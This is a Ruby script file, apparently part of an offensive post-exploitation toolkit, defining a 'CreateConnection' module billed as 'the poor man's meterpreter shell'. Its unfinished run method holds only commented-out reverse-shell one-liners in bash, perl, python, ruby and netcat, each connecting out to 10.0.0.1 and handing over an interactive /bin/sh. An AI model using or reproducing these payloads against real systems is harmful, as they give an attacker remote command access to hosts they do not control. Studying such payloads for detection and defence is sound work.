require_relative "corescript.rb"

class CreateConnection < CoreScript

  def initialize
    keyword = 'createconnection'
    description = 'create a secondary connection to be held in the background, the poor man\'s meterpreter shell'
    @options = Hash.new
    option_parser = OptionParser.new
    option_parser.banner = "Usage: ft"
    option_parser.on_tail("-h", "--help", "Show this message") do
      #nicely formatted help message
      puts option_parser
    end
    super(keyword, description, option_parser)
  end

  def run_script(shell, pp, rest_of_line = nil)
    #MANDATORY
    #necessary for all scripts
    #arr_of_cmd_strings = ["find"]
    #return unless needed_commands(shell, pp, arr_of_cmd_strings)
    return unless needed_commands(shell, pp)
    #/MANDATORY

    
    #bash
    #bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

    #perl
    #perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

    #python
    #python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    #ruby
    #ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

    #nc -e
    #nc -e /bin/sh 10.0.0.1 1234

    #nc TODO test
    #rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
  end
#CreateConnection
end

